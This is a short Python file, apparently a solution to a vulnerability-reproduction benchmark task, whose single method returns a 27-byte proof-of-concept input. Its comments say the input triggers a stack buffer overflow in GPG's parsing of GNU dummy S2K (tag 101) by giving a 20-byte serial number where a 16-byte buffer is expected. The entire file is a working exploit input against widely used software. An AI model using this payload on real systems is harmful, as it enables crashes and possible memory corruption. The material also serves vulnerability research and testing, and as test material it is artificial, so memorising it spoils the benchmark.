import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generates a PoC for a stack buffer overflow in GPG S2K parsing.
        # Vulnerability involves handling of excessively long serial numbers in GNU dummy S2K (Tag 101).
        # Format constructed:
        # - S2K Tag: 0x65 (101)
        # - Hash Algo: 0x08 (SHA256)
        # - Magic: "GNU"
        # - Mode: 0x01 (Shadowed/Card)
        # - Serial Length: 0x14 (20 bytes) - overflows typical 16-byte buffer
        # - Serial Data: 20 bytes of padding
        # Total Length: 1 + 1 + 3 + 1 + 1 + 20 = 27 bytes
        return b'\x65\x08GNU\x01\x14' + b'A' * 20
